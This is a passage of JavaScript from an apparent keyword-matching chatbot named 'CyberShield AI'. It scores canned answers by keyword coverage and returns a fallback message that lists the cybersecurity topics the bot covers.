    }

    // Bonus: more keywords matched relative to total keywords in this item
    const matchedCount = item.keywords.filter(kw => msg.includes(kw.toLowerCase())).length;
    const coverageRatio = matchedCount / item.keywords.length;
    score += coverageRatio * 0.5;

    if (score > highestScore) {
      highestScore = score;
      bestMatch = item;
    }
  }

  if (bestMatch && highestScore >= 0.8) {
    return bestMatch.response;
  }

  // ── Fallback: partial fuzzy match for very short queries ──
  if (bestMatch && highestScore > 0) {
    return bestMatch.response;
  }

  return `I'm your CyberShield AI — deeply knowledgeable in cybersecurity. I didn't find an exact match for "${userMessage.substring(0, 60)}", but I cover: phishing, malware, ransomware, zero-days, encryption, penetration testing, cloud security, OWASP vulnerabilities, compliance (GDPR, HIPAA, PCI DSS), threat intelligence, incident response, and much more. Try rephrasing with specific security terms — or ask me anything from the world of cybersecurity!`;
};